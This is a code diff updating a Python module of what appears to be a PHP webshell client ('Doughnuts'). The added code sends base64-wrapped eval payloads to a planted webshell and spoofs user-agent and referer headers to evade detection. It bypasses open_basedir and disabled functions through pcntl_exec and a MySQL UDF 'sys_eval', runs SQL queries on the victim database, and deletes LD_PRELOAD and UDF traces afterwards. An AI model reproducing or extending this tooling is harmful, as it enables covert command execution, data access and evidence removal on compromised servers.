@@ -1,14 +1,17 @@
-from subprocess import check_output, Popen
 from base64 import b64decode, b64encode
+from binascii import b2a_hex
+from locale import getpreferredencoding
 from platform import system
 from pprint import pprint
-from random import randint, sample
+from random import choice, randint, sample
+from string import ascii_letters, digits
+from subprocess import Popen, check_output
 from types import MethodType
 from urllib.parse import quote
 from uuid import uuid4
-from locale import getpreferredencoding
 
 import requests
+from prettytable import PrettyTable
 from requests.models import complexjson
 from requests.utils import guess_json_utf
 from urllib3 import disable_warnings
@@ -16,11 +19,12 @@ from urllib3 import disable_warnings
 from libs.config import color, gget, gset
 from libs.debug import DEBUG
 
-level = []
-connect_pipe_map = {True: "│  ", False: "   "}
+LEVEL = []
+CONNECT_PIPE_MAP = {True: "│  ", False: "   "}
 SYSTEM_TEMPLATE = None
 Session = requests.Session()
-local_encoding = getpreferredencoding()
+LOCAL_ENCODING = getpreferredencoding()
+ALPATHNUMERIC = ascii_letters + digits
 
 
 disable_warnings()
@@ -57,30 +61,35 @@ def banner():
     if logo_choose == 3:
         print(
             r"""
-'########:::'#######::'##::::'##::'######:::'##::::'##:'##::: ##:'##::::'##:'########::'######::
- # .... ##:'##.... ##: ##:::: ##:'##... ##:: ##:::: ##: ###:: ##: ##:::: ##:... ##..::'##... ##:
- # :::: ##: ##:::: ##: ##:::: ##: ##:::..::: ##:::: ##: ####: ##: ##:::: ##:::: ##:::: ##:::..::
- # :::: ##: ##:::: ##: ##:::: ##: ##::'####: #########: ## ## ##: ##:::: ##:::: ##::::. ######::
- # :::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##.... ##: ##. ####: ##:::: ##:::: ##:::::..... ##:
- # :::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##:::: ##: ##:. ###: ##:::: ##:::: ##::::'##::: ##:
- # ::. #######::. #######::. ######::: ##:::: ##: ##::. ##:. #######::::: ##::::. ######::
-........::::.......::::.......::::......::::..:::::..::..::::..:::.......::::::..::::::......:::
+
+ ________  ________  ___  ___  ________  ___  ___  ________   ___  ___  _________  ________
+|\   ___ \|\   __  \|\  \|\  \|\   ____\|\  \|\  \|\   ___  \|\  \|\  \|\___   ___\\   ____\
+\ \  \_|\ \ \  \|\  \ \  \\\  \ \  \___|\ \  \\\  \ \  \\ \  \ \  \\\  \|___ \  \_\ \  \___|_
+ \ \  \ \\ \ \  \\\  \ \  \\\  \ \  \  __\ \   __  \ \  \\ \  \ \  \\\  \   \ \  \ \ \_____  \
+  \ \  \_\\ \ \  \\\  \ \  \\\  \ \  \|\  \ \  \ \  \ \  \\ \  \ \  \\\  \   \ \  \ \|____|\  \
+   \ \_______\ \_______\ \_______\ \_______\ \__\ \__\ \__\\ \__\ \_______\   \ \__\  ____\_\  \
+    \|_______|\|_______|\|_______|\|_______|\|__|\|__|\|__| \|__|\|_______|    \|__| |\_________\
+                                                                                     \|_________|
 
 """
         )
-    print(color.green("Doughnut Version: 3.2\n"))
+    print(color.green("Doughnut Version: 3.9\n"))
 
 
-def base64_encode(data: str):
-    return b64encode(data.encode()).decode()
+def base64_encode(data: str, encoding="utf-8"):
+    return b64encode(data.encode(encoding=encoding)).decode()
 
 
-def base64_decode(data: str):
-    return b64decode(data.encode()).decode()
+def base64_decode(data: str, encoding="utf-8"):
+    return b64decode(data.encode()).decode(encoding=encoding)
+
+
+def hex_encode(data: str):
+    return b2a_hex(data.encode()).decode()
 
 
 def clean_trace():
-    def get_clean_ld_preload_php(filename: str):
+    def get_clean_php(filename: str):
         system_clean_command = f"rm -f {filename} && echo success"
         return """$f=base64_decode("%s");
     if (!unlink($f)){
@@ -88,17 +97,24 @@ def clean_trace():
     }else{echo "success";}
     """ % (base64_encode(filename), get_system_code(system_clean_command))
     ld_preload_filename = gget("webshell.ld_preload_path", "webshell", None)
-    if (ld_preload_filename):
-        print(color.yellow("\nClean LD_PRELOAD traces...\n"))
-        res = send(get_clean_ld_preload_php(ld_preload_filename))
-        if (res):
-            text = res.r_text.strip()
-            if ("success" in text):
-                print(color.green("Clean success\n"))
-            else:
-                print(color.red("Clean failed\n"))
+    udf_filename = gget("webshell.udf_path", "webshell", None)
+    clean_files = (ld_preload_filename, udf_filename)
+    for each in clean_files:
+        if (each):
+            print(color.yellow("\nClean %s ...\n" % each))
+            res = send(get_clean_php(each))
+            if (res):
+                text = res.r_text.strip()
+                if ("success" in text):
+                    print(color.green("Clean success\n"))
+                else:
+                    print(color.red("Clean failed\n"))
+    if (udf_filename):
+        print(color.yellow("\nClean udf ...\n"))
+        execute_sql_command("delete from mysql.func where name='sys_eval';")
     gset("webshell.ld_preload_path", None, True, "webshell")
     gset("webshell.ld_preload_func", None, True, "webshell")
+    gset("webshell.udf_path", None, True, "webshell")
 
 
 def r_json(self, **kwargs):
@@ -114,11 +130,119 @@ def r_json(self, **kwargs):
     return complexjson.loads(self.r_text, **kwargs)
 
 
-def send(data: str, raw: bool = False, **extra_params):
-    offset = 8
+def randstr(string="", offset=8):
+    return ''.join(sample(string, offset))
 
-    def randstr(offset):
-        return ''.join(sample("!@#$%^&*()[];,.?", offset))
+
+def trush(min_num=2, max_num=4):
+    return randstr(ALPATHNUMERIC, randint(min_num, max_num))
+
+
+def fake_ua():
+    user_agents = gget("user_agents", default=(
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",))
+    return choice(user_agents).strip()
+
+
+def fake_referer():
+    i = randint(1, 6)
+    random_params = ""
+    for _ in range(randint(4, 8)):
+        random_params += f"{trush()}={trush()}&"
+    random_params = random_params.strip("&")
+    if (i == 1):
+        return f"https://www.google.{trush(2,2)}/url?{random_params}"
+    elif (i == 2):
+        return f"https://blog.csdn.net/{trush(5, 12)}/article/details/{randint(10000, 99999)}?{random_params}"
+    elif (i == 3):
+        return f"https://www.baidu.com/?q={trush(2,10)}&{random_params}"
+    elif (i == 4):
+        return f"https://www.google.com/?q={trush(2,10)}&{random_params}"
+    elif (i == 5):
+        return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"
+    elif (i == 6):
+        return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"
+
+
+def get_db_connect_code(host="", username="", password="", dbname="", port=""):
+    host = host if host else gget("db_host", "webshell", "")
+    username = username if username else gget("db_username", "webshell", "")
+    password = password if password else gget("db_password", "webshell", "")
+    dbname = dbname if dbname else gget("db_dbname", "webshell", "")
+    port = port if port else gget("db_port", "webshell", "")
+    connect_type = gget("db_connect_type", "webshell")
+    dbms = gget("db_ext", "webshell")
+    if (connect_type == "pdo"):
+        extra_port = f"port={port};" if port else ""
+        extra_dbname = f"dbname={dbname};" if dbname else ""
+        return f'$dsn="{dbms}:host={host};{extra_port}{extra_dbname}";$con= new PDO($dsn,"{username}","{password}");'
+    elif (connect_type == "mysqli"):
+        connect_code = '$con=mysqli_connect(%s);'
+        temp_code = ",".join([f'"{y}"' for y in filter(
+            lambda x: x, (host, username, password, dbname, port))])
+        return connect_code % temp_code
+    return ""
+
+
+def get_sql_command_php(command, database, ruid, luid):
+    connect_type = gget("db_connect_type", "webshell")
+    connect_code = get_db_connect_code(dbname=database)
+    command = base64_encode(command)
+    if (connect_type == "pdo"):
+        return """try{%s
+$r=$con->query(base64_decode('%s'));
+$rows=$r->fetchAll(PDO::FETCH_ASSOC);
+foreach($rows[0] as $k=>$v){
+    echo "$k"."%s";
+}
+echo "%s";
+foreach($rows as $array){foreach($array as $k=>$v){echo "$v"."%s";};echo "%s";}
+} catch (PDOException $e){
+die("Connect error: ". $e->getMessage());
+}""" % (connect_code, command, luid, ruid, luid, ruid)
+    elif (connect_type == "mysqli"):
+        return """%s
+$r=$con->query(base64_decode('%s'));
+$rows=$r->fetch_all(MYSQLI_ASSOC);
+foreach($rows[0] as $k=>$v){
+    echo "$k"."%s";
+}
+echo "%s";
+foreach($rows as $array){foreach($array as $k=>$v){echo "$v"."%s";};echo "%s";}""" % (connect_code, command, luid, ruid, luid, ruid)
+    else:
+        return ""
+
+
+def execute_sql_command(command, database: str = "", raw: bool = False):
+    database = database if (database) else gget("db_dbname", "webshell")
+    ruid = str(uuid4())
+    luid = str(uuid4())
+    res = send(get_sql_command_php(command, database, ruid, luid))
+    if (not res):
+        return ''
+    rows = res.r_text.strip().split(ruid)
+    if (raw):
+        return [row.split(luid)[:-1] for row in rows[:-1]]
+    elif (len(rows) > 1):
+        info = rows[0].split(luid)[:-1]
+        form = PrettyTable(info)
+        for row in rows[1:-1]:
+            row_data = row.split(luid)[:-1]
+            if (row_data):
+                form.add_row(row_data)
+        return form
+    return ''
+
+
+def send(phpcode: str, raw: bool = False, **extra_params):
+    # extra_params['quiet'] 不显示错误信息
+    offset = 8
+    encode_recv = False
+    quiet = False
+    if ("quiet" in extra_params):
+        del extra_params["quiet"]
+        quiet = True
+
     url = gget("webshell.url", "webshell")
     params_dict = gget("webshell.params_dict", "webshell").copy()
     php_v7 = gget("webshell.v7", "webshell")
@@ -129,14 +253,20 @@ def send(data: str, raw: bool = False, **extra_params):
     params_dict.update(extra_params)
     if "data" not in params_dict:
         params_dict["data"] = {}
-    head = randstr(offset)
-    tail = randstr(offset)
+    head = randstr("!@#$%^&*()[];,.?", offset)
+    tail = randstr("!@#$%^&*()[];,.?", offset)
     pwd_b64 = b64encode(
         gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
+    raw_data = phpcode
     if not raw:
-        data = f"""error_reporting(0);chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
+        encode_head = "ob_start();" if encode_recv else ""
+        encode_tail = """$ooDoo=ob_get_clean();
+$encode = mb_detect_encoding($ooDoo, array('ASCII','UTF-8',"GB2312","GBK",'BIG5','ISO-8859-1','latin1'));
+$ooDoo = mb_convert_encoding($ooDoo, 'UTF-8', $encode);
+print(base64_encode($ooDoo));""" if encode_recv else ""
+        phpcode = f"""error_reporting(0);{encode_head}chdir(base64_decode("{pwd_b64}"));print("{head}");""" + phpcode
         if (gget("webshell.bypass_obd", "webshell")):
-            data = """$dir=pos(glob("./*", GLOB_ONLYDIR));
+            phpcode = """$dir=pos(glob("./*", GLOB_ONLYDIR));
 $cwd=getcwd();
 $ndir="./%s";
 if($dir === false){
@@ -147,31 +277,38 @@ ini_set("open_basedir","..");
 $c=substr_count(getcwd(), "/");
 for($i=0;$i<$c;$i++) chdir("..");
 ini_set("open_basedir", "/");
-chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
-        data += f"""print("{tail}");"""
-        data = f"""eval(base64_decode("{base64_encode(data)}"));"""
+chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
+        phpcode += f"""print("{tail}");{encode_tail}"""
+        phpcode = f"""eval(base64_decode("{base64_encode(phpcode)}"));"""
         if (not php_v7):
-            data = f"""assert(eval(base64_decode("{base64_encode(data)}")));"""
+            phpcode = f"""assert(eval(base64_decode("{base64_encode(phpcode)}")));"""
     for func in encode_functions:
         if func in encode_pf:
-            data = encode_pf[func].run(data)
+            phpcode = encode_pf[func].run(phpcode)
         elif ("doughnuts" in str(func)):
             _, salt = func.split("-")
-            data = encode_pf["doughnuts"].run(data, salt)
+            phpcode = encode_pf["doughnuts"].run(phpcode, salt)
     if (raw_key == "cookies"):
-        data = quote(data)
-    params_dict[raw_key][password] = data
+        phpcode = quote(phpcode)
+    params_dict['headers']['User-agent'] = fake_ua()
+    params_dict['headers']['Referer'] = fake_referer()
+    params_dict[raw_key][password] = phpcode
     try:
         req = Session.post(url, verify=False, **params_dict)
     except requests.RequestException:
-        print(color.red("\nRequest Error\n"))
+        if (not quiet):
+            print(color.red("\nRequest Error\n"))
         return
     if (req.apparent_encoding):
         req.encoding = encoding = req.apparent_encoding
     else:
         encoding = "utf-8"
-    text = req.text
-    content = req.content
+    if (raw or not encode_recv):
+        text = req.text
+        content = req.content
+    else:
+        text = base64_decode(req.text)
+        content = b64decode(req.content)
     text_head_offset = text.find(head)
     text_tail_offset = text.find(tail)
     text_head_offset = text_head_offset + \
@@ -194,9 +331,11 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
         for k, v in params_dict.items():
             print(f"{k}: ", end="")
             pprint(v)
-        print(color.green(f"----DEBUG RESPONSE----"))
-        print(req.r_text)
-        if (not req.r_text):
+        print("raw payload:\n" + raw_data)
+        if (req.text):
+            print(color.green(f"----DEBUG RESPONSE----"))
+            print(req.r_text)
+        else:
             print(color.green(f"----DEBUG RAW RESPONSE----"))
             print(req.text)
         print(color.yellow(f"------DEBUG END-------\n"))
@@ -239,6 +378,9 @@ def prepare_system_template(exec_func: str):
         SYSTEM_TEMPLATE = """$o=shell_exec(base64_decode("%s"));"""
     elif (exec_func == 'popen'):
         SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);"""
+    elif (exec_func == 'pcntl_exec'):
+        filename = uuid4()
+        SYSTEM_TEMPLATE = """$r='/tmp/%s';if(pcntl_fork() === 0) {$cmd = base64_decode("%s");$args = array("-c","$cmd 2>&1 1>$r");pcntl_exec("/bin/bash", $args);exit(0);}pcntl_wait($status);$o=file_get_contents('/tmp/%s');unlink('/tmp/%s');""" % (filename, "%s", filename, filename)
 
 
 def get_system_code(command: str, print_result: bool = True, mode: int = 0):
@@ -960,10 +1102,33 @@ sleep(1);
 $o=file_get_contents("/tmp/%s");
 %s
 unlink("/tmp/%s");}""" % (base64_encode(command), tmpname, tmpname, print_command, tmpname)
+    elif (bypass_df == 8):
+        connect_type = gget("db_connect_type", "webshell")
+        if (connect_type == "pdo"):
+            return """try{%s
+$r=$con->query("select sys_eval(unhex('%s'))");
+$rr=$r->fetch();
+$o=$rr[0];
+$GLOBAL['o']=$o;
+%s
+} catch (PDOException $e){
+}""" % (get_db_connect_code(), hex_encode(command), print_command)
+        elif (connect_type == "mysql"):
+            return """%s
+if ($con)
+{
+$r=$con->query(select sys_eval(unhex('%s')));
+$rr=$r->fetch_all(MYSQLI_NUM);
+$o=$rr[0];
+$GLOBAL['o']=$o;
+%s
+$r->close();
+$con->close();
+}""" % (get_db_connect_code(), hex_encode(command), print_command)
     elif (gget("webshell.exec_func", "webshell")):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
     else:
-        return """print("No system execute function!\\n");"""
+        return """print("No system execute function\\n");"""
 
 
 def is_windows(remote: bool = True):
@@ -991,7 +1156,7 @@ def has_env(env: str, remote: bool = True):
             flag = gget("webshell.has_%s" % env, "webshell")
     else:
         if (not gget("has_%s" % env)):
-            flag = check_output([command, env]).strip().decode(local_encoding)
+            flag = check_output([command, env]).strip().decode(LOCAL_ENCODING)
             gset("has_%s" % env, flag)
         else:
             flag = gget("has_%s" % env)
@@ -999,14 +1164,18 @@ def has_env(env: str, remote: bool = True):
 
 
 def open_editor(file_path: str, editor: str = ""):
-    editor = editor if editor else ("notepad.exe" if has_env("notepad.exe") else "vi")
-    if (has_env(editor, False)):
-        path = gget(f"has_{editor}")
+    if (editor):
+        if (has_env(editor, False)):
+            binpath = gget(f"has_{editor}")
+            if ("\n" in binpath):
+                binpath = binpath.split("\n")[0]
+        else:
+            print(color.red(f"{editor} not found in local environment"))
+            return False
     else:
-        print(color.red(f"{editor} not found in local environment"))
-        return False
+        binpath = "notepad.exe" if has_env("notepad.exe", False) else "vi"
     try:
-        p = Popen([path, file_path], shell=False)
+        p = Popen([binpath, file_path], shell=False)
         p.wait()
         return True
     except FileNotFoundError:
@@ -1016,7 +1185,7 @@ def open_editor(file_path: str, editor: str = ""):
 def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
     if (is_file):
         pipe = "└─" if (end) else "├─"
-        connect_pipe = "".join([connect_pipe_map[_] for _ in level[:depth-1]])
+        connect_pipe = "".join([CONNECT_PIPE_MAP[_] for _ in LEVEL[:depth-1]])
         try:
             tree_or_node = b64decode(tree_or_node.encode()).decode('gbk')
         except Exception:
@@ -1033,7 +1202,7 @@ def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
             _print_tree(v, depth+1, is_file=True, end=end)  # 输出目录
     elif (isinstance(tree_or_node, dict)):
         index = 0
-        level.append(True)
+        LEVEL.append(True)
         for k, v in tree_or_node.items():
             index += 1
             if (index == len(tree_or_node)):
@@ -1041,15 +1210,15 @@ def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
             if (isinstance(v, (list, dict))):  # 树中树
                 _print_tree(k, depth+1, is_file=True, end=end)  # 输出目录
                 if (end):
-                    level[depth] = False
+                    LEVEL[depth] = False
                 _print_tree(v, depth+1)  # 递归输出树x
             elif (isinstance(v, str)) or v is None:  # 节点
                 _print_tree(v, depth+1, is_file=True, end=end)  # 输出文件
 
 
 def print_tree(name, tree):
-    global level
-    level = []
+    global LEVEL
+    LEVEL = []
     print(name)
     _print_tree(tree)
 
